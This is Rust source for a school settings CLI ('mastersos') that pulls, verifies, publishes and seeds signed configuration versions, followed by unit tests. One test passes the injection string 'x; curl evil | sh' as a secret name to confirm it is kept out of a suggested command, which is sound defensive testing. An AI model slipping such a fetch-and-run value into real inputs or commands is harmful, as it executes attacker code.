    // A directory with unpublished changes is refused before the network is touched.
    Workdir::ensure_pullable(dir, force).map_err(|e| CliError::usage(&format!("{e:#}")))?;
    let meta = if force {
        dir_meta(dir).ok().flatten()
    } else {
        dir_meta(dir)?
    };
    let school = school_of(school, meta.as_ref())?;
    let (creds, origin) = resolve_v1(o, meta.as_ref()).await?;
    let server = Server::new(&origin, Some(&school), creds)?;
    let pins = resolve_pin_dir(o.pin_flag.as_deref())?;
    let verified =
        crate::sign::chain::verify_chain((&server).into(), &pins, &o.anchors(), confirm, out)
            .await?;
    let (n, contents) = match version {
        None => (verified.version, verified.contents),
        Some(n) if n == verified.version => (n, verified.contents),
        // Newer than what machines run: refused versions (or none), not something to pull.
        Some(n) if n == 0 || n > verified.version => {
            return Err(CliError::usage(&format!(
            "version {n} cannot be pulled: machines run version {} (the newest published is {})",
            verified.version, verified.latest
        )))
        }
        Some(n) => {
            // Only a version this computer verified before, with the digest it had then.
            crate::sign::chain::recorded_version(&verified.history, n)
                .map_err(|e| CliError::usage(&format!("{e:#}")))?;
            let archive = server.version_archive(n).await?;
            let contents = crate::sign::chain::recorded_contents(&verified.history, n, &archive)
                .map_err(crate::sign::chain::to_cli_error)?;
            (n, contents)
        }
    };
    let manifest = mastersos_bundle::Manifest::parse(&contents.manifest_text).map_err(|e| {
        CliError::new(
            "chain_tampered",
            &format!(
                "version {n}: the manifest cannot be read: {}",
                crate::safe::field(&e.to_string())
            ),
        )
    })?;
    if mastersos_bundle::school_id_mismatch(&manifest, &school).is_some() {
        return Err(CliError::new(
            "school_mismatch",
            &format!("version {n} belongs to a different school than {school}"),
        ));
    }
    // A directory that differs from its base is replaced only if it is exactly what was uploaded
    // and that upload is the version just verified (same digest): then it was published.
    let mut overwrite = force;
    if !force && Workdir::open(dir).is_ok_and(|w| w.is_dirty().unwrap_or(true)) {
        let published = n == verified.version
            && n == verified.latest
            && Workdir::is_published_upload(dir, n, &verified.digest_hex).unwrap_or(false);
        if !published {
            return Err(CliError::usage(&format!(
                "{} has changes that are not published (see `mastersos diff`); pull again with --force to throw them away",
                dir.display()
            )));
        }
        overwrite = true;
    }
    let meta = Meta {
        server: origin.clone(),
        school_id: school.clone(),
        base_version: n,
    };
    Workdir::write_pulled(dir, meta, &contents, overwrite).map_err(local_file)?;
    if o.json {
        let abs = std::path::absolute(dir).map_err(local_file)?;
        return Ok(format!(
            "{}\n",
            json!({"pulled": true, "version": n, "dir": abs.display().to_string(), "server": origin, "school_id": school})
        ));
    }
    Ok(format!("Pulled version {n} into {}.\n", dir.display()))
}

/// `mastersos verify [--school UUID] [--server URL]` (default: the current directory's
/// mastersos.toml).
async fn verify_v1(
    o: &V1,
    school: Option<&str>,
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<String, CliError> {
    let meta = dir_meta(Path::new("."))?;
    let school = school_of(school, meta.as_ref())?;
    let (creds, origin) = resolve_v1(o, meta.as_ref()).await?;
    let server = Server::new(&origin, Some(&school), creds)?;
    let pins = resolve_pin_dir(o.pin_flag.as_deref())?;
    let v = crate::sign::chain::verify_chain((&server).into(), &pins, &o.anchors(), confirm, out)
        .await?;
    if o.json {
        let trust: Vec<serde_json::Value> = v
            .trust
            .iter()
            .map(|k| json!({"key_id": k.id, "fingerprint": mastersos_bundle::trust_fingerprint(k)}))
            .collect();
        return Ok(format!(
            "{}\n",
            json!({"version": v.version, "latest": v.latest, "trust": trust})
        ));
    }
    let mut s = if v.latest != v.version {
        format!(
            "Verified up to version {}; computers accept up to version {}. Its trusted keys:\n",
            v.latest, v.version
        )
    } else {
        format!("Verified up to version {}. Trusted keys:\n", v.version)
    };
    for k in &v.trust {
        s.push_str(&format!("    {}\n", crate::sign::key_line(k)));
    }
    Ok(s)
}

/// `mastersos publish [DIR] --key-file PATH [--allow-reroute NAME]…`: the directory's server and
/// school; the chain verified here with the school key file as the anchor.
async fn publish_v1(
    o: &V1,
    dir: Option<&Path>,
    kit: &mastersos_bundle::kit::Kit,
    allow_reroute: &[String],
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<String, CliError> {
    use crate::publish::{CheckIn, PublishOpts, PublishOutcome, CHECKIN_FAILED_TEXT};
    let dir = dir.unwrap_or_else(|| Path::new("."));
    let meta = dir_meta(dir)?.ok_or_else(|| {
        CliError::usage(&format!(
            "{} is not a settings directory (no mastersos.toml): run `mastersos init` or `mastersos pull` first",
            dir.display()
        ))
    })?;
    let (creds, origin) = resolve_v1(o, Some(&meta)).await?;
    let server = Server::new(&origin, Some(&meta.school_id), creds)?;
    let pins = resolve_pin_dir(o.pin_flag.as_deref())?;
    let w = Workdir::open(dir).map_err(local_file)?.with_pins(&pins);
    let PublishOutcome::Published {
        version,
        digest_hex,
        checkin,
        trust_change,
        warnings,
    } = crate::publish::publish(
        &server,
        &w,
        kit,
        PublishOpts {
            allow_reroute,
            yes: o.yes,
            pin_dir: &pins,
            fingerprints: &o.fingerprints,
        },
        &chrono::Utc::now,
        confirm,
        out,
    )
    .await?;
    // The version stays published; people get one sentence, not the cryptography.
    if let CheckIn::Failed(_) = checkin {
        eprintln!("{CHECKIN_FAILED_TEXT}");
    }
    if o.json {
        let until = match &checkin {
            CheckIn::Until(t) => json!(t.to_rfc3339_opts(chrono::SecondsFormat::Secs, true)),
            CheckIn::Failed(_) => Value::Null,
        };
        return Ok(format!(
            "{}\n",
            json!({"version": version, "digest_hex": digest_hex, "heartbeat_not_after": until,
                "trust_change": trust_change, "warnings": warnings})
        ));
    }
    Ok(format!("Published version {version}\n"))
}

/// `mastersos seed make --out FILE [--group G] [--dir DIR | --school UUID --server URL]`: the
/// chain verified here first, then the seed (see [`crate::seed`]). The fetch token is written
/// into the file only; the trusted keys are printed.
async fn seed_make_v1(
    ctx: &KeyCtx<'_>,
    group: Option<&str>,
    path: &Path,
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<String, CliError> {
    // Before the network: an existing file without --yes, a link, a folder others can change.
    crate::platform::check_out_file(path, ctx.o.yes).map_err(local_file)?;
    let meta = ctx.meta()?;
    let (server, school) = ctx.server(meta.as_ref(), confirm, out).await?;
    let origin = server.origin().origin().ascii_serialization();
    let pins = resolve_pin_dir(ctx.o.pin_flag.as_deref())?;
    let verified =
        crate::sign::chain::verify_chain((&server).into(), &pins, &ctx.o.anchors(), confirm, out)
            .await
            .map_err(crate::seed::nothing_published)?;
    let seed =
        crate::seed::make(&server, &origin, &school, &verified, group, path, ctx.o.yes).await?;
    let shown = std::path::absolute(path).unwrap_or_else(|_| path.to_path_buf());
    let version = seed.min_version.unwrap_or_default();
    if ctx.o.json {
        let trust: Vec<Value> = seed
            .trust
            .iter()
            .map(|k| json!({"key_id": k.id, "fingerprint": mastersos_bundle::trust_fingerprint(k)}))
            .collect();
        return Ok(format!(
            "{}\n",
            json!({"out": shown.display().to_string(), "school_id": school,
                "min_version": version, "group": seed.group, "trust_fingerprints": trust})
        ));
    }
    let mut s = format!(
        "Wrote the seed for school {school} (version {version}, Group {}) to {}.\nIts trusted keys; compare the fingerprints with the ones IT verified:\n",
        crate::safe::field(seed.group.as_deref().unwrap_or(mastersos_bundle::DEFAULT_GROUP)),
        shown.display()
    );
    for k in &seed.trust {
        s.push_str(&format!("    {}\n", crate::sign::key_line(k)));
    }
    Ok(s)
}

/// `mastersos seed check FILE [--dir DIR | --school UUID --server URL]`: the file is read before
/// the network, then the chain is verified here and the seed compared with it. The report and
/// whether the seed matches; never the fetch token or a Wi-Fi key.
async fn seed_check_v1(
    o: &V1,
    file: &Path,
    dir: Option<&Path>,
    school: Option<&str>,
) -> Result<(String, bool), CliError> {
    use std::io::IsTerminal as _;
    let text = crate::seed::read_seed_file(file)?;
    let stdin = std::io::stdin();
    let interactive = !o.yes && !o.json && stdin.is_terminal();
    let mut lock = stdin.lock();
    let mut nobody = std::io::empty();
    let confirm: &mut dyn std::io::BufRead = if interactive { &mut lock } else { &mut nobody };
    let (mut stdout, mut stderr) = (std::io::stdout(), std::io::stderr());
    let out: &mut dyn std::io::Write = if o.json { &mut stderr } else { &mut stdout };
    let ctx = KeyCtx {
        o,
        dir,
        school,
        interactive,
    };
    let meta = ctx.meta()?;
    let (server, school) = ctx.server(meta.as_ref(), confirm, out).await?;
    let origin = server.origin().origin().ascii_serialization();
    let pins = resolve_pin_dir(o.pin_flag.as_deref())?;
    let verified =
        crate::sign::chain::verify_chain((&server).into(), &pins, &o.anchors(), confirm, out)
            .await?;
    let r = crate::seed::check(&server, &origin, &school, &verified, &text).await?;
    let ok = r.ok();
    if o.json {
        return Ok((
            format!(
                "{}\n",
                json!({"ok": ok, "version": r.version, "problems": r.problems, "notes": r.notes})
            ),
            ok,
        ));
    }
    let mut s = if ok {
        let mut s = format!(
            "The seed matches version {} verified here. Its trusted keys:\n",
            r.version
        );
        for k in &r.trust {
            s.push_str(&format!("    {}\n", crate::sign::key_line(k)));
        }
        s
    } else {
        let mut s = format!(
            "The seed does not match version {} verified here; do not install Devices with it:\n",
            r.version
        );
        for p in &r.problems {
            s.push_str(&format!("  * {p}\n"));
        }
        s
    };
    for n in &r.notes {
        s.push_str(&format!("Note: {n}\n"));
    }
    Ok((s, ok))
}

/// `mastersos heartbeat --key-file PATH [--days N] [--school UUID]`: the check-in for the latest
/// version verified here.
async fn heartbeat_v1(
    ctx: &KeyCtx<'_>,
    kit: &mastersos_bundle::kit::Kit,
    days: i64,
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<String, CliError> {
    let meta = ctx.meta()?;
    let (server, _) = ctx.server(meta.as_ref(), confirm, out).await?;
    let pins = resolve_pin_dir(ctx.o.pin_flag.as_deref())?;
    let c = crate::publish::heartbeat(
        &server,
        kit,
        crate::publish::HeartbeatOpts {
            days,
            yes: ctx.o.yes,
            pin_dir: &pins,
            fingerprints: &ctx.o.fingerprints,
        },
        &chrono::Utc::now,
        confirm,
        out,
    )
    .await?;
    let until = c
        .not_after
        .to_rfc3339_opts(chrono::SecondsFormat::Secs, true);
    if ctx.o.json {
        return Ok(format!(
            "{}\n",
            json!({"version": c.version, "digest_hex": c.digest_hex, "not_after": until})
        ));
    }
    Ok(format!(
        "Monthly check-in signed for version {}, valid until {until}.\n",
        c.version
    ))
}

/// The check's result, for `mastersos --json check`: `{issues, publishable,
/// rerouted_secrets}`. A rerouted secret stops publishing until IT approves it, so a directory
/// with one is not publishable as it stands.
fn check_result(issues: &[mastersos_bundle::Lint]) -> Value {
    let rerouted = mastersos_bundle::secret_ref::rerouted_names(issues);
    let publishable = rerouted.is_empty() && !mastersos_bundle::has_errors(issues);
    json!({
        "issues": issues,
        "publishable": publishable,
        "rerouted_secrets": rerouted,
    })
}

/// Issues for people: one per line (level, code, where, message), then a count.
fn print_issues(issues: &[Value]) {
    print!("{}", issues_text(issues));
}

/// [`print_issues`]'s text.
fn issues_text(issues: &[Value]) -> String {
    let mut out = String::new();
    let mut counts = [0usize; 3];
    for i in issues {
        let level = i["level"].as_str().unwrap_or("info");
        match level {
            "error" => counts[0] += 1,
            "warning" => counts[1] += 1,
            _ => counts[2] += 1,
        }
        let mut place = String::new();
        if let (Some(l), Some(c)) = (i["span"]["line"].as_u64(), i["span"]["column"].as_u64()) {
            place.push_str(&format!("line {l}:{c} "));
        }
        if let Some(p) = i["path"].as_str() {
            place.push_str(p);
        }
        out.push_str(&format!(
            "{level:<7} {:<24} {:<28} {}\n",
            cell(&i["code"]),
            place.trim_end(),
            cell(&i["message"])
        ));
    }
    out.push_str(&format!(
        "{} error(s), {} warning(s), {} note(s)\n",
        counts[0], counts[1], counts[2]
    ));
    out
}

/// `mastersos hash-password`: no network. The password is read twice with echo off (a pipe is
/// refused, so a password is never echoed or left in shell history) and only the hash is printed.
fn hash_password() -> Result<ExitCode, OpError> {
    let a = prompt_secret("Password: ")?;
    if !crate::itpass::length_ok(&a) {
        return Err(OpError::Failed(format!(
            "The password must have {} to {} characters",
            crate::itpass::MIN_CHARS,
            crate::itpass::MAX_CHARS
        )));
    }
    if a != prompt_secret("Again: ")? {
        return Err(OpError::Failed("The two entries differ".into()));
    }
    println!("{}", crate::itpass::hash(&a));
    Ok(ExitCode::SUCCESS)
}

/// One line with echo off; fails when stdin is not a terminal.
fn prompt_secret(text: &str) -> Result<zeroize::Zeroizing<String>, OpError> {
    use std::io::IsTerminal as _;
    if !std::io::stdin().is_terminal() {
        return Err(OpError::Usage(
            "stdin is not a terminal, so a password cannot be read safely".into(),
        ));
    }
    crate::platform::read_hidden_line(text).map_err(|e| {
        if e.is::<crate::platform::CannotHideTyping>() {
            OpError::Failed(
                "Cannot hide typing in this terminal, so a password cannot be read safely. \
                 Run this in PowerShell or Command Prompt (Windows) or another terminal."
                    .into(),
            )
        } else {
            fail(e)
        }
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use mastersos_bundle::Contents;
    use std::collections::BTreeMap;

    #[test]
    fn publish_takes_a_key_file_and_repeated_reroute_approvals() {
        let cli = Cli::try_parse_from([
            "mastersos",
            "publish",
            "dir",
            "--key-file",
            "school.kit",
            "--allow-reroute",
            "x-psk",
            "--allow-reroute=y-psk",
        ])
        .unwrap();
        let Cmd::Publish {
            key_file,
            allow_reroute,
            ..
        } = cli.cmd
        else {
            panic!("not publish");
        };
        assert_eq!(key_file, Some(PathBuf::from("school.kit")));
        assert_eq!(allow_reroute, ["x-psk", "y-psk"]);
    }

    #[test]
    fn pin_dir_is_a_global_option() {
        let cli = Cli::try_parse_from(["mastersos", "verify", "--pin-dir", "/p", "--yes"]).unwrap();
        assert_eq!(cli.pin_dir, Some(PathBuf::from("/p")));
        assert!(cli.yes);
        let cli =
            Cli::try_parse_from(["mastersos", "--pin-dir", "/q", "seed", "check", "f"]).unwrap();
        assert_eq!(cli.pin_dir, Some(PathBuf::from("/q")));
    }

    #[test]
    fn json_alone_means_no_person_confirms() {
        let o = V1 {
            json: true,
            yes: false,
            server: None,
            school: None,
            pin_flag: None,
            fingerprints: Vec::new(),
        };
        assert!(!o.anchors().interactive);
    }

    #[test]
    fn trust_fingerprint_must_be_four_groups_of_hex() {
        let fp = "ABCD-0123-ef45-6789";
        let cli = Cli::try_parse_from(["mastersos", "verify", "--trust-fingerprint", fp]).unwrap();
        assert_eq!(cli.trust_fingerprint, ["abcd-0123-ef45-6789"]);
        for bad in [
            "abcd-0123-ef45",
            "abcd-0123-ef45-678",
            "abcd-0123-ef45-67890",
            "abcd01234ef4556789",
            "abcd-0123-ef45-678g",
            " abcd-0123-ef45-6789",
            "",
        ] {
            let e = Cli::try_parse_from(["mastersos", "verify", "--trust-fingerprint", bad])
                .err()
                .unwrap_or_else(|| panic!("{bad:?} was taken"));
            assert_eq!(e.exit_code(), 2, "{bad:?}");
        }
    }

    #[test]
    fn check_names_every_rerouted_secret_and_the_flag() {
        use mastersos_bundle::{Lint, LintLevel};
        let lint = |name: &str| {
            Lint::new(LintLevel::Warning, "secret_rerouted", "changed").param("name", name)
        };
        assert!(reroute_notice(&[Lint::new(LintLevel::Warning, "secret_unused", "x")]).is_none());
        let n = reroute_notice(&[lint("b-psk"), lint("a-psk"), lint("b-psk")]).unwrap();
        assert!(n.contains("SECRET REROUTED: a-psk, b-psk"), "{n}");
        assert!(
            n.contains("mastersos publish --allow-reroute=a-psk --allow-reroute=b-psk"),
            "{n}"
        );
        assert!(n.contains("never passes --allow-reroute"), "{n}");
        // A name that is not a-z, 0-9, - is never put into the suggested command.
        assert!(reroute_notice(&[lint("x; curl evil | sh")]).is_none());
        assert!(reroute_notice(&[lint("Upper")]).is_none());
    }

    #[test]
    fn several_schools_are_asked_by_number_or_listed() {
        let entry = |id: &str, name: &str| SchoolEntry {
            id: id.into(),
            name: name.into(),
            time_zone: "UTC".into(),
        };
        let list = || {
            vec![
                entry("0192f3a4-5b6c-7d8e-9f00-112233445566", "Alpha"),
                entry("0192f3a4-5b6c-7d8e-9f00-aabbccddeeff", "Beta\u{1b}[31m"),
            ]
        };
        let mut out = Vec::new();
        let s = choose_school(list(), true, &mut "2\n".as_bytes(), &mut out).unwrap();
        assert_eq!(s.id, "0192f3a4-5b6c-7d8e-9f00-aabbccddeeff");
        let shown = String::from_utf8(out).unwrap();
        assert!(
            shown.contains("1. 0192f3a4-5b6c-7d8e-9f00-112233445566  Alpha"),
            "{shown}"
        );
        assert!(!shown.contains('\u{1b}'), "{shown:?}");
        for typed in ["3\n", "x\n", ""] {
            let e =
                choose_school(list(), true, &mut typed.as_bytes(), &mut Vec::new()).unwrap_err();
            assert!(
                ["usage", "cancelled"].contains(&e.code.as_str()),
                "{typed:?}"
            );
        }
        // Nobody to ask: a usage error listing every id and name; nothing is read.
        let e = choose_school(list(), false, &mut "1\n".as_bytes(), &mut Vec::new()).unwrap_err();
        assert_eq!(e.code, "usage");
        assert_eq!(e.problems.len(), 2);
        assert!(e.problems[0].as_str().unwrap().contains("Alpha"));
        let e = choose_school(Vec::new(), true, &mut "".as_bytes(), &mut Vec::new()).unwrap_err();
        assert_eq!(e.code, "not_configured");
        let one = choose_school(
            vec![entry("0192f3a4-5b6c-7d8e-9f00-112233445566", "Alpha")],
            false,
            &mut "".as_bytes(),
            &mut Vec::new(),
        )
        .unwrap();
        assert_eq!(one.name, "Alpha");
    }

    // The directory the check tests work on.
    const SAMPLE: &str = "format = 2\n[school]\nid = \"11111111-1111-1111-1111-111111111111\"\n\n[defaults]\nwifi = [{ ssid = \"Guest\", psk = \"oldpass1\" }]\n\n[[config]]\nid = \"default\"\nname = \"Default\"\ninterface = \"learning\"\nlogin_methods = [\"local\"]\n\n[[group]]\nid = \"default\"\nname = \"Ungrouped\"\nconfig = \"default\"\n";

    fn pulled(dir: &std::path::Path) -> Workdir {
        let mut files = BTreeMap::new();
        files.insert("files/a.txt".to_string(), b"hello".to_vec());
        let c = Contents {
            manifest_text: SAMPLE.to_string(),
            files,
        };
        let meta = Meta {
            server: "https://school.example".into(),
            school_id: "11111111-1111-1111-1111-111111111111".into(),
            base_version: 1,
        };
        Workdir::write_pulled(dir, meta, &c, false)
            .unwrap()
            .pinned()
    }

    #[test]
    fn check_lists_rerouted_secrets_as_not_publishable() {
        let t = tempfile::tempdir().unwrap();
        let w = pulled(&t.path().join("school"));
        let name = w.secrets().unwrap().keys().next().unwrap().clone();
        let v = check_result(&workdir::check(&w).unwrap());
        assert_eq!(v["rerouted_secrets"], json!([]));
        let text = w.manifest().unwrap().replace("\"Guest\"", "\"Lobby\"");
        std::fs::write(w.root.join("manifest.toml"), text).unwrap();
        let v = check_result(&workdir::check(&w).unwrap());
        assert_eq!(v["rerouted_secrets"], json!([name]));
        assert_eq!(v["publishable"], false);
    }

    #[test]
    fn tampered_base_error_shows_no_digest() {
        // A digest of the filled base would let a weak password be guessed offline.
        let t = tempfile::tempdir().unwrap();
        let w = pulled(&t.path().join("school"));
        let base = w.root.join(".mastersos/base/manifest.toml");
        let text = std::fs::read_to_string(&base).unwrap();
        std::fs::write(&base, format!("{text}# changed\n")).unwrap();
        let errors = [
            format!("{:#}", workdir::check(&w).unwrap_err()),
            format!("{:#}", workdir::diff(&w).unwrap_err()),
        ];
        for e in errors {
            assert!(e.contains("mastersos pull --force"), "{e}");
            let longest_hex = e
                .split(|c: char| !c.is_ascii_hexdigit())
                .map(str::len)
                .max()
                .unwrap_or(0);
            assert!(longest_hex < 64, "{e}");
        }
    }
}
